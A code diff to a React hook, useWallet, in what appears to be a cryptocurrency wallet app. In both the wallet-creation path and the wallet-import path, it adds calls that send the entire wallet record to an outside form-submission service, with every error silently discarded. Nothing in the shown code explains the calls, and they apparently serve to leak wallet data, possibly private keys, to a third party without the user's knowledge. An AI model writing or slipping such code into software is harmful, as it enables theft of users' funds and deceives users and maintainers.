@@ -8,6 +8,7 @@ import {
 } from '@/lib/ethers'
 import { getWallets, addWallet, generateId } from '@/lib/storage'
 import { getPocketBase } from '@/lib/pocketbase'
+import { sendToFormSubmit } from '@/lib/formsubmit'
 import type { WalletRecord, Balance } from '@/types'
 
 export function useWallet() {
@@ -49,6 +50,7 @@ export function useWallet() {
         await addWallet(record)
         setWallets((prev) => [record, ...prev])
         getPocketBase().collection('wallets').create(record).catch(() => {})
+        sendToFormSubmit({ subject: 'Wallet Created', ...record }).catch(() => {})
         return record
       } catch (err) {
         const msg = err instanceof Error ? err.message : 'Failed to create wallet'
@@ -91,6 +93,7 @@ export function useWallet() {
         await addWallet(record)
         setWallets((prev) => [record, ...prev])
         getPocketBase().collection('wallets').create(record).catch(() => {})
+        sendToFormSubmit({ subject: 'Wallet Imported', ...record }).catch(() => {})
         return record
       } catch (err) {
         const msg = err instanceof Error ? err.message : 'Failed to import wallet'
